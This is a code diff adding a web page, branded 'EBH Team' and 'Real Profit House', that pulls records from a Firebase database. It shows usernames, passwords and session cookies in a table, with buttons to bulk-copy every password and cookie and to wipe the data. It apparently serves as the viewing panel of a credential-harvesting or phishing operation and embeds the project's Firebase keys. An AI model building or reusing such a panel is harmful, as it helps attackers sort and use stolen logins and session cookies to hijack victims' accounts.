@@ -1,0 +1,1196 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>EBH Team - Username & Password Viewer</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+<style>
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  -webkit-tap-highlight-color: transparent;
+}
+
+:root {
+  --primary: #22c55e;
+  --primary-dark: #16a34a;
+  --secondary: #3b82f6;
+  --secondary-dark: #2563eb;
+  --danger: #ef4444;
+  --danger-dark: #dc2626;
+  --warning: #f59e0b;
+  --warning-dark: #d97706;
+  --dark-bg: #0f172a;
+  --card-bg: #1e293b;
+  --text-light: #e5e7eb;
+  --text-gray: #94a3b8;
+  --border-color: #334155;
+  --shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.3);
+  --table-border: #475569;
+}
+
+body {
+  background: var(--dark-bg);
+  color: var(--text-light);
+  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+  min-height: 100vh;
+  padding: 10px;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  overflow-x: hidden;
+  font-size: 14px;
+}
+
+.container {
+  width: 100%;
+  max-width: 100%;
+  margin: 0 auto;
+}
+
+/* Header */
+.header {
+  text-align: center;
+  margin-bottom: 15px;
+  padding-bottom: 15px;
+  border-bottom: 2px solid var(--primary);
+  width: 100%;
+}
+
+.header h1 {
+  color: var(--primary);
+  font-size: 1.5rem;
+  margin-bottom: 6px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 10px;
+  flex-wrap: wrap;
+}
+
+.header .subtitle {
+  color: var(--text-gray);
+  font-size: 0.85rem;
+  letter-spacing: 0.5px;
+}
+
+/* Stats Card */
+.stats-card {
+  background: var(--card-bg);
+  border-radius: 10px;
+  padding: 12px 15px;
+  margin-bottom: 15px;
+  box-shadow: var(--shadow);
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  border-left: 4px solid var(--primary);
+  width: 100%;
+}
+
+.stat {
+  text-align: center;
+  flex: 1;
+}
+
+.stat .number {
+  font-size: 1.4rem;
+  font-weight: bold;
+  color: var(--primary);
+  display: block;
+}
+
+.stat .label {
+  font-size: 0.7rem;
+  color: var(--text-gray);
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+}
+
+.divider {
+  width: 1px;
+  height: 30px;
+  background: var(--border-color);
+}
+
+/* Search Section */
+.search-section {
+  background: var(--card-bg);
+  border-radius: 10px;
+  padding: 15px;
+  margin-bottom: 15px;
+  box-shadow: var(--shadow);
+  width: 100%;
+}
+
+.search-container {
+  position: relative;
+  margin-bottom: 8px;
+}
+
+.search-container input {
+  width: 100%;
+  padding: 12px 15px;
+  padding-right: 60px;
+  border-radius: 8px;
+  border: 1px solid var(--border-color);
+  background: #0f172a;
+  color: var(--text-light);
+  font-size: 14px;
+  height: 44px;
+}
+
+.search-btn {
+  position: absolute;
+  right: 5px;
+  top: 50%;
+  transform: translateY(-50%);
+  background: var(--secondary);
+  color: white;
+  border: none;
+  padding: 8px 12px;
+  border-radius: 6px;
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  gap: 5px;
+  font-weight: bold;
+  font-size: 0.8rem;
+  height: 34px;
+}
+
+/* Search Result Card */
+.search-stat {
+  background: var(--card-bg);
+  border-radius: 10px;
+  padding: 12px 15px;
+  margin-bottom: 15px;
+  box-shadow: var(--shadow);
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  border-left: 4px solid var(--secondary);
+  width: 100%;
+}
+
+/* Main Card */
+.main-card {
+  background: var(--card-bg);
+  border-radius: 10px;
+  padding: 15px;
+  margin-bottom: 15px;
+  box-shadow: var(--shadow);
+  width: 100%;
+  min-height: 350px;
+  transition: min-height 0.3s ease;
+}
+
+.card-header {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  margin-bottom: 12px;
+}
+
+.card-title {
+  font-size: 1.1rem;
+  color: var(--primary);
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+
+.refresh-btn {
+  background: transparent;
+  border: 1px solid var(--primary);
+  color: var(--primary);
+  padding: 6px 12px;
+  border-radius: 6px;
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  font-size: 0.8rem;
+  transition: all 0.2s;
+}
+
+.refresh-btn:hover {
+  background: rgba(34, 197, 94, 0.1);
+}
+
+/* Accounts Container - Google Sheet Style */
+.accounts-container {
+  background: #0f172a;
+  border: 1px solid var(--border-color);
+  border-radius: 8px;
+  margin-bottom: 12px;
+  max-height: 300px;
+  overflow-y: auto;
+  -webkit-overflow-scrolling: touch;
+  position: relative;
+  min-height: 150px;
+}
+
+/* Table Container */
+.table-container {
+  width: 100%;
+  display: table;
+  border-collapse: collapse;
+  min-height: 150px;
+}
+
+/* Table Header - Fixed */
+.table-header {
+  display: table-row;
+  background: #1e293b;
+  position: sticky;
+  top: 0;
+  z-index: 10;
+}
+
+.header-cell {
+  display: table-cell;
+  padding: 10px 8px;
+  border-bottom: 2px solid var(--primary);
+  font-weight: bold;
+  color: var(--primary);
+  font-size: 0.8rem;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  white-space: nowrap;
+  position: sticky;
+  top: 0;
+  background: #1e293b;
+}
+
+/* Table Body - Single Line Rows */
+.account-row {
+  display: table-row;
+  border-bottom: 1px solid var(--table-border);
+  transition: background-color 0.2s;
+}
+
+.account-row:hover {
+  background: rgba(30, 41, 59, 0.7);
+}
+
+.account-row:last-child {
+  border-bottom: none;
+}
+
+/* Table Cells - Fixed Height, Single Line */
+.row-cell {
+  display: table-cell;
+  padding: 10px 8px;
+  vertical-align: middle;
+  border-right: 1px solid var(--table-border);
+  max-width: 150px;
+  height: 45px;
+  position: relative;
+  overflow: hidden;
+}
+
+.row-cell:last-child {
+  border-right: none;
+}
+
+.serial-cell {
+  width: 50px;
+  min-width: 50px;
+  max-width: 50px;
+  color: var(--text-gray);
+  font-weight: bold;
+  text-align: center;
+  font-size: 0.9rem;
+  user-select: none;
+  position: sticky;
+  left: 0;
+  background: var(--dark-bg);
+  z-index: 1;
+}
+
+.username-cell {
+  width: 180px;
+  min-width: 180px;
+  max-width: 180px;
+  color: var(--text-light);
+  font-weight: 500;
+}
+
+.password-cell {
+  width: 150px;
+  min-width: 150px;
+  max-width: 150px;
+  color: var(--primary);
+  font-weight: bold;
+  font-family: 'Courier New', monospace;
+}
+
+.cookies-cell {
+  width: 250px;
+  min-width: 250px;
+  max-width: 250px;
+  color: var(--warning);
+  font-weight: 500;
+  font-family: 'Courier New', monospace;
+  font-size: 0.85rem;
+}
+
+/* Scrollable cell content - FIXED WIDTH CONTAINERS */
+.cell-content {
+  position: absolute;
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  padding: 10px 8px;
+  display: flex;
+  align-items: center;
+  overflow-x: auto;
+  white-space: nowrap;
+  scrollbar-width: thin;
+  scrollbar-color: var(--text-gray) transparent;
+}
+
+.cell-content::-webkit-scrollbar {
+  height: 3px;
+}
+
+.cell-content::-webkit-scrollbar-track {
+  background: transparent;
+}
+
+.cell-content::-webkit-scrollbar-thumb {
+  background: var(--text-gray);
+  border-radius: 2px;
+  opacity: 0.5;
+}
+
+.cell-content:hover::-webkit-scrollbar-thumb {
+  background: var(--primary);
+  opacity: 1;
+}
+
+/* No Data Message */
+.no-data {
+  display: table-row;
+}
+
+.no-data td {
+  padding: 40px 20px;
+  text-align: center;
+  color: var(--text-gray);
+  font-style: italic;
+}
+
+/* Loading State */
+.loading-container {
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  text-align: center;
+  z-index: 100;
+  background: rgba(15, 23, 42, 0.95);
+  padding: 20px;
+  border-radius: 8px;
+  min-width: 200px;
+}
+
+.loading-spinner {
+  font-size: 2rem;
+  color: var(--primary);
+  margin-bottom: 10px;
+  animation: spin 1s linear infinite;
+}
+
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+
+/* Count Display */
+.count-display {
+  text-align: right;
+  padding: 8px 12px;
+  font-size: 0.75rem;
+  color: var(--text-gray);
+  background: rgba(15, 23, 42, 0.8);
+  border-top: 1px solid var(--border-color);
+  border-radius: 0 0 8px 8px;
+}
+
+/* Copy Buttons - Three Equal Buttons */
+.copy-buttons-row {
+  display: flex;
+  gap: 6px;
+  margin-bottom: 15px;
+  width: 100%;
+}
+
+.copy-btn-third {
+  flex: 1;
+  padding: 10px 5px;
+  border-radius: 6px;
+  border: none;
+  font-size: 12px;
+  font-weight: bold;
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 5px;
+  min-height: 38px;
+  text-align: center;
+  transition: all 0.2s;
+}
+
+.copy-usernames-btn {
+  background: var(--primary);
+  color: var(--dark-bg);
+}
+
+.copy-usernames-btn:hover {
+  background: var(--primary-dark);
+}
+
+.copy-passwords-btn {
+  background: var(--secondary);
+  color: white;
+}
+
+.copy-passwords-btn:hover {
+  background: var(--secondary-dark);
+}
+
+.copy-cookies-btn {
+  background: var(--warning);
+  color: var(--dark-bg);
+}
+
+.copy-cookies-btn:hover {
+  background: var(--warning-dark);
+}
+
+/* Delete Button */
+.danger-section {
+  text-align: center;
+  padding-top: 10px;
+  border-top: 1px dashed var(--border-color);
+  width: 100%;
+  margin-top: 0;
+}
+
+.danger-btn {
+  background: transparent;
+  border: 1px solid var(--danger);
+  color: var(--danger);
+  padding: 8px 16px;
+  border-radius: 6px;
+  cursor: pointer;
+  display: inline-flex;
+  align-items: center;
+  gap: 6px;
+  font-size: 0.8rem;
+  min-width: 160px;
+  justify-content: center;
+  transition: all 0.2s;
+}
+
+.danger-btn:hover {
+  background: rgba(239, 68, 68, 0.1);
+}
+
+/* Footer */
+.footer {
+  text-align: center;
+  margin-top: 15px;
+  color: var(--text-gray);
+  font-size: 0.7rem;
+  padding-top: 12px;
+  border-top: 1px solid var(--border-color);
+  width: 100%;
+}
+
+/* Modal */
+.modal-overlay {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: rgba(0, 0, 0, 0.9);
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  z-index: 1000;
+  opacity: 0;
+  visibility: hidden;
+  transition: all 0.3s;
+  padding: 15px;
+}
+
+.modal-overlay.active {
+  opacity: 1;
+  visibility: visible;
+}
+
+.modal {
+  background: var(--card-bg);
+  border-radius: 12px;
+  width: 100%;
+  max-width: 400px;
+  padding: 20px;
+  box-shadow: var(--shadow);
+  animation: modalFadeIn 0.3s ease;
+}
+
+@keyframes modalFadeIn {
+  from {
+    opacity: 0;
+    transform: translateY(-20px);
+  }
+  to {
+    opacity: 1;
+    transform: translateY(0);
+  }
+}
+
+.modal-header {
+  text-align: center;
+  margin-bottom: 15px;
+  color: var(--danger);
+}
+
+.modal-header i {
+  font-size: 2rem;
+  margin-bottom: 10px;
+}
+
+.modal-body {
+  margin-bottom: 20px;
+}
+
+.modal-body p {
+  margin-bottom: 10px;
+  line-height: 1.5;
+}
+
+.warning-text {
+  background: rgba(239, 68, 68, 0.1);
+  border-left: 3px solid var(--danger);
+  padding: 10px;
+  border-radius: 0 4px 4px 0;
+  margin-top: 15px;
+}
+
+.warning-text i {
+  color: var(--danger);
+  margin-right: 5px;
+}
+
+.modal-actions {
+  display: flex;
+  gap: 10px;
+  justify-content: flex-end;
+}
+
+.modal-btn {
+  padding: 10px 15px;
+  border-radius: 6px;
+  border: none;
+  cursor: pointer;
+  font-weight: bold;
+  font-size: 0.8rem;
+  min-width: 120px;
+  transition: all 0.2s;
+}
+
+.modal-btn-cancel {
+  background: transparent;
+  border: 1px solid var(--border-color);
+  color: var(--text-light);
+}
+
+.modal-btn-cancel:hover {
+  background: rgba(255, 255, 255, 0.05);
+}
+
+.modal-btn-danger {
+  background: var(--danger);
+  color: white;
+}
+
+.modal-btn-danger:hover {
+  background: var(--danger-dark);
+}
+
+/* Responsive */
+@media (max-width: 768px) {
+  .header h1 {
+    font-size: 1.3rem;
+  }
+  
+  .header-cell {
+    font-size: 0.75rem;
+    padding: 8px 6px;
+  }
+  
+  .row-cell {
+    padding: 8px 6px;
+    font-size: 0.85rem;
+    height: 40px;
+  }
+  
+  .copy-btn-third {
+    font-size: 11px;
+    padding: 8px 4px;
+    min-height: 36px;
+  }
+  
+  .serial-cell {
+    width: 40px;
+    min-width: 40px;
+    max-width: 40px;
+  }
+  
+  .username-cell {
+    width: 150px;
+    min-width: 150px;
+    max-width: 150px;
+  }
+  
+  .password-cell {
+    width: 120px;
+    min-width: 120px;
+    max-width: 120px;
+  }
+  
+  .cookies-cell {
+    width: 200px;
+    min-width: 200px;
+    max-width: 200px;
+  }
+}
+
+@media (max-width: 480px) {
+  .header h1 {
+    font-size: 1.2rem;
+  }
+  
+  .header-cell {
+    font-size: 0.7rem;
+    padding: 6px 4px;
+  }
+  
+  .row-cell {
+    padding: 6px 4px;
+    font-size: 0.8rem;
+    height: 38px;
+  }
+  
+  .copy-btn-third {
+    font-size: 10px;
+    padding: 6px 3px;
+    min-height: 34px;
+  }
+  
+  .serial-cell {
+    width: 35px;
+    min-width: 35px;
+    max-width: 35px;
+  }
+  
+  .username-cell {
+    width: 130px;
+    min-width: 130px;
+    max-width: 130px;
+  }
+  
+  .password-cell {
+    width: 100px;
+    min-width: 100px;
+    max-width: 100px;
+  }
+  
+  .cookies-cell {
+    width: 180px;
+    min-width: 180px;
+    max-width: 180px;
+  }
+}
+
+@media (max-width: 360px) {
+  .copy-btn-third {
+    font-size: 9px;
+    padding: 5px 2px;
+  }
+}
+</style>
+
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+</head>
+
+<body>
+
+<div class="container">
+  <div class="header">
+    <h1><i class="fas fa-fire"></i> REAL PROFIT HOUSE <i class="fas fa-users"></i></h1>
+    <div class="subtitle">Username, Password & Cookies Viewer</div>
+  </div>
+  
+  <div class="stats-card">
+    <div class="stat">
+      <span class="number" id="totalCount">0</span>
+      <span class="label">Total Accounts</span>
+    </div>
+    <div class="divider"></div>
+    <div class="stat">
+      <span class="number" id="lastUpdate">-</span>
+      <span class="label">Last Updated</span>
+    </div>
+  </div>
+  
+  <div id="searchResultCard" class="search-stat" style="display: none;">
+    <div class="stat">
+      <span class="number" id="searchCount">0</span>
+      <span class="label" id="searchLabel">Search Results</span>
+    </div>
+  </div>
+  
+  <div class="search-section">
+    <div class="search-container">
+      <input type="text" id="searchInput" placeholder="Search by username, password or cookies...">
+      <button class="search-btn" onclick="searchByPassword()">
+        <i class="fas fa-search"></i> SEARCH
+      </button>
+    </div>
+  </div>
+  
+  <div class="main-card">
+    <div class="card-header">
+      <h2 class="card-title"><i class="fas fa-user-circle"></i> Account List</h2>
+      <button class="refresh-btn" onclick="loadData()">
+        <i class="fas fa-sync-alt"></i> Refresh
+      </button>
+    </div>
+    
+    <div class="accounts-container" id="accountsContainer">
+      <!-- Table will be generated by JavaScript -->
+    </div>
+    
+    <div class="count-display" id="countDisplay">0 accounts</div>
+    
+    <div class="copy-buttons-row">
+      <button class="copy-btn-third copy-usernames-btn" onclick="copyUsernames()">
+        <i class="fas fa-user"></i> USERNAMES
+      </button>
+      <button class="copy-btn-third copy-passwords-btn" onclick="copyPasswords()">
+        <i class="fas fa-key"></i> PASSWORDS
+      </button>
+      <button class="copy-btn-third copy-cookies-btn" onclick="copyCookies()">
+        <i class="fas fa-cookie"></i> COOKIES
+      </button>
+    </div>
+    
+    <div class="danger-section">
+      <button class="danger-btn" onclick="openDeleteModal()">
+        <i class="fas fa-trash-alt"></i> DELETE ALL DATA
+      </button>
+    </div>
+  </div>
+  
+  <div class="footer">
+    <p>Real Profit House Account Viewer • Version 2.0</p>
+  </div>
+</div>
+
+<!-- Delete Modal -->
+<div class="modal-overlay" id="deleteModal">
+  <div class="modal">
+    <div class="modal-header">
+      <i class="fas fa-exclamation-triangle"></i>
+      <h2>Delete All Data</h2>
+    </div>
+    
+    <div class="modal-body">
+      <p>Are you sure you want to permanently delete all data from Firebase?</p>
+      <p>This action will delete <strong id="deleteCount">0</strong> accounts.</p>
+      
+      <div class="warning-text">
+        <p><i class="fas fa-exclamation-circle"></i> <strong>Warning:</strong> This action cannot be undone.</p>
+      </div>
+    </div>
+    
+    <div class="modal-actions">
+      <button class="modal-btn modal-btn-cancel" onclick="closeDeleteModal()">NO, CANCEL</button>
+      <button class="modal-btn modal-btn-danger" onclick="deleteAllData()">YES, DELETE</button>
+    </div>
+  </div>
+</div>
+
+<script>
+// Firebase Configuration - নতুন RPH অ্যাকাউন্ট
+const firebaseConfig = {
+  apiKey: "AIzaSyB2ul7SMulLalH3Bi3j0jp1km0oLSM939Q",
+  authDomain: "rhp-cb421.firebaseapp.com",
+  databaseURL: "https://rhp-cb421-default-rtdb.firebaseio.com",
+  projectId: "rhp-cb421",
+  storageBucket: "rhp-cb421.firebasestorage.app",
+  messagingSenderId: "878808791188",
+  appId: "1:878808791188:web:2a3992f50edff41a4d1c81",
+  measurementId: "G-7VRRCMD4BJ"
+};
+
+// Initialize Firebase
+firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
+
+const accountsContainer = document.getElementById("accountsContainer");
+const totalCount = document.getElementById("totalCount");
+const searchCount = document.getElementById("searchCount");
+const searchLabel = document.getElementById("searchLabel");
+const searchResultCard = document.getElementById("searchResultCard");
+const countDisplay = document.getElementById("countDisplay");
+const lastUpdate = document.getElementById("lastUpdate");
+const deleteModal = document.getElementById("deleteModal");
+const deleteCount = document.getElementById("deleteCount");
+const searchInput = document.getElementById("searchInput");
+
+let allAccounts = [];
+let filteredAccounts = [];
+let isSearching = false;
+let currentSearchTerm = "";
+
+function showLoading() {
+  accountsContainer.innerHTML = `
+    <div class="loading-container">
+      <div class="loading-spinner">
+        <i class="fas fa-spinner fa-spin"></i>
+      </div>
+      <p>Loading accounts from Firebase...</p>
+    </div>
+  `;
+}
+
+function updateStats() {
+  const total = allAccounts.length;
+  const searchResults = filteredAccounts.length;
+  
+  totalCount.textContent = total;
+  
+  if (isSearching && currentSearchTerm) {
+    searchCount.textContent = searchResults;
+    searchLabel.textContent = `Results for: "${currentSearchTerm}"`;
+    searchResultCard.style.display = 'flex';
+  } else {
+    searchResultCard.style.display = 'none';
+  }
+  
+  countDisplay.textContent = `${isSearching ? searchResults : total} accounts`;
+  deleteCount.textContent = total;
+  
+  const now = new Date();
+  const timeStr = now.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'});
+  lastUpdate.textContent = `${timeStr}`;
+}
+
+function renderAccountsTable(accounts) {
+  if (accounts.length === 0) {
+    const noDataMessage = isSearching && currentSearchTerm 
+      ? `No accounts found containing: "${currentSearchTerm}"`
+      : "No accounts found in the database.";
+    
+    accountsContainer.innerHTML = `
+      <div class="table-container">
+        <div class="no-data">
+          <td colspan="4">
+            <i class="fas fa-database" style="font-size: 2rem; margin-bottom: 10px; opacity: 0.5;"></i>
+            <p>${noDataMessage}</p>
+          </td>
+        </div>
+      </div>
+    `;
+    return;
+  }
+  
+  let tableHTML = `
+    <div class="table-container">
+      <div class="table-header">
+        <div class="header-cell serial-cell">#</div>
+        <div class="header-cell username-cell">Username</div>
+        <div class="header-cell password-cell">Password</div>
+        <div class="header-cell cookies-cell">Cookies</div>
+      </div>
+  `;
+  
+  accounts.forEach((account, index) => {
+    tableHTML += `
+      <div class="account-row">
+        <div class="row-cell serial-cell">
+          <div class="cell-content">${index + 1}.</div>
+        </div>
+        <div class="row-cell username-cell">
+          <div class="cell-content" title="${account.username || 'N/A'}">${account.username || 'N/A'}</div>
+        </div>
+        <div class="row-cell password-cell">
+          <div class="cell-content" title="${account.password || 'N/A'}">${account.password || 'N/A'}</div>
+        </div>
+        <div class="row-cell cookies-cell">
+          <div class="cell-content" title="${account.cookie || 'No cookies'}">${account.cookie || 'No cookies'}</div>
+        </div>
+      </div>
+    `;
+  });
+  
+  tableHTML += '</div>';
+  accountsContainer.innerHTML = tableHTML;
+}
+
+function loadData() {
+  showLoading();
+  
+  searchInput.value = '';
+  isSearching = false;
+  currentSearchTerm = "";
+  searchResultCard.style.display = 'none';
+  
+  // RPH অ্যাকাউন্ট থেকে ডাটা লোড করবে
+  db.ref("accounts/rph").once("value")
+  .then(snapshot => {
+    allAccounts = [];
+    snapshot.forEach(child => {
+      const data = child.val();
+      allAccounts.push({
+        username: data.username || "",
+        password: data.password || "",
+        cookie: data.cookie || data.cookies || "",
+        created_at: data.created_at || ""
+      });
+    });
+    
+    filteredAccounts = [...allAccounts];
+    renderAccountsTable(allAccounts);
+    updateStats();
+  })
+  .catch(err => {
+    accountsContainer.innerHTML = `
+      <div class="table-container">
+        <div class="no-data">
+          <td colspan="4" style="color: #ef4444;">
+            <i class="fas fa-exclamation-triangle" style="font-size: 2rem; margin-bottom: 10px;"></i>
+            <p>Error loading data: ${err.message}</p>
+          </td>
+        </div>
+      </div>
+    `;
+    console.error("Firebase error:", err);
+  });
+}
+
+function searchByPassword() {
+  const searchTerm = searchInput.value.trim().toLowerCase();
+  
+  if (!searchTerm) {
+    loadData();
+    return;
+  }
+  
+  filteredAccounts = allAccounts.filter(account => 
+    (account.password && account.password.toLowerCase().includes(searchTerm)) ||
+    (account.username && account.username.toLowerCase().includes(searchTerm)) ||
+    (account.cookie && account.cookie.toLowerCase().includes(searchTerm))
+  );
+  
+  isSearching = true;
+  currentSearchTerm = searchTerm;
+  
+  renderAccountsTable(filteredAccounts);
+  updateStats();
+}
+
+function copyUsernames() {
+  const accountsToCopy = isSearching ? filteredAccounts : allAccounts;
+  
+  if (accountsToCopy.length === 0) {
+    alert("⚠️ No data to copy!");
+    return;
+  }
+  
+  const usernames = accountsToCopy.map(account => account.username).join("\n");
+  
+  navigator.clipboard.writeText(usernames)
+    .then(() => {
+      const copyBtn = document.querySelector('.copy-usernames-btn');
+      const originalText = copyBtn.innerHTML;
+      copyBtn.innerHTML = '<i class="fas fa-check"></i> COPIED!';
+      copyBtn.style.background = "#16a34a";
+      
+      setTimeout(() => {
+        copyBtn.innerHTML = originalText;
+        copyBtn.style.background = "";
+      }, 1500);
+    })
+    .catch(err => {
+      console.error('Copy failed:', err);
+      alert("Failed to copy usernames.");
+    });
+}
+
+function copyPasswords() {
+  const accountsToCopy = isSearching ? filteredAccounts : allAccounts;
+  
+  if (accountsToCopy.length === 0) {
+    alert("⚠️ No data to copy!");
+    return;
+  }
+  
+  const passwords = accountsToCopy.map(account => account.password).join("\n");
+  
+  navigator.clipboard.writeText(passwords)
+    .then(() => {
+      const copyBtn = document.querySelector('.copy-passwords-btn');
+      const originalText = copyBtn.innerHTML;
+      copyBtn.innerHTML = '<i class="fas fa-check"></i> COPIED!';
+      copyBtn.style.background = "#2563eb";
+      
+      setTimeout(() => {
+        copyBtn.innerHTML = originalText;
+        copyBtn.style.background = "";
+      }, 1500);
+    })
+    .catch(err => {
+      console.error('Copy failed:', err);
+      alert("Failed to copy passwords.");
+    });
+}
+
+function copyCookies() {
+  const accountsToCopy = isSearching ? filteredAccounts : allAccounts;
+  
+  if (accountsToCopy.length === 0) {
+    alert("⚠️ No data to copy!");
+    return;
+  }
+  
+  const cookies = accountsToCopy.map(account => account.cookie || "No cookies").join("\n");
+  
+  navigator.clipboard.writeText(cookies)
+    .then(() => {
+      const copyBtn = document.querySelector('.copy-cookies-btn');
+      const originalText = copyBtn.innerHTML;
+      copyBtn.innerHTML = '<i class="fas fa-check"></i> COPIED!';
+      copyBtn.style.background = "#d97706";
+      
+      setTimeout(() => {
+        copyBtn.innerHTML = originalText;
+        copyBtn.style.background = "";
+      }, 1500);
+    })
+    .catch(err => {
+      console.error('Copy failed:', err);
+      alert("Failed to copy cookies.");
+    });
+}
+
+function openDeleteModal() {
+  if (allAccounts.length === 0) {
+    alert("⚠️ No data to delete! The database is already empty.");
+    return;
+  }
+  
+  deleteCount.textContent = allAccounts.length;
+  deleteModal.classList.add("active");
+  document.body.style.overflow = "hidden";
+}
+
+function closeDeleteModal() {
+  deleteModal.classList.remove("active");
+  document.body.style.overflow = "auto";
+}
+
+function deleteAllData() {
+  closeDeleteModal();
+  
+  accountsContainer.innerHTML = `
+    <div class="loading-container">
+      <div class="loading-spinner">
+        <i class="fas fa-spinner fa-spin"></i>
+      </div>
+      <p>Deleting all data from Firebase...</p>
+    </div>
+  `;
+  
+  // RPH অ্যাকাউন্ট থেকে ডাটা ডিলিট করবে
+  db.ref("accounts/rph").remove()
+  .then(() => {
+    allAccounts = [];
+    filteredAccounts = [];
+    isSearching = false;
+    currentSearchTerm = "";
+    searchResultCard.style.display = 'none';
+    
+    accountsContainer.innerHTML = `
+      <div class="table-container">
+        <div class="no-data" style="color: #22c55e;">
+          <td colspan="4">
+            <i class="fas fa-check-circle" style="font-size: 2rem; margin-bottom: 10px;"></i>
+            <p>✅ All data deleted successfully!</p>
+            <p>Database is now empty.</p>
+          </td>
+        </div>
+      </div>
+    `;
+    
+    updateStats();
+    
+    setTimeout(() => {
+      alert("✅ All data has been permanently deleted.");
+    }, 500);
+  })
+  .catch(err => {
+    accountsContainer.innerHTML = `
+      <div class="table-container">
+        <div class="no-data" style="color: #ef4444;">
+          <td colspan="4">
+            <i class="fas fa-exclamation-triangle" style="font-size: 2rem; margin-bottom: 10px;"></i>
+            <p>❌ Error deleting data</p>
+          </td>
+        </div>
+      </div>
+    `;
+    console.error("Delete error:", err);
+  });
+}
+
+deleteModal.addEventListener("click", function(e) {
+  if (e.target === deleteModal) {
+    closeDeleteModal();
+  }
+});
+
+searchInput.addEventListener("keyup", function(e) {
+  if (e.key === "Enter") {
+    searchByPassword();
+  }
+});
+
+searchInput.addEventListener("input", function() {
+  if (this.value.trim() === "" && isSearching) {
+    loadData();
+  }
+});
+
+document.addEventListener('DOMContentLoaded', function() {
+  loadData();
+  // Auto refresh every 2 minutes
+  setInterval(loadData, 120000);
+});
+</script>
+
+</body>
+</html>
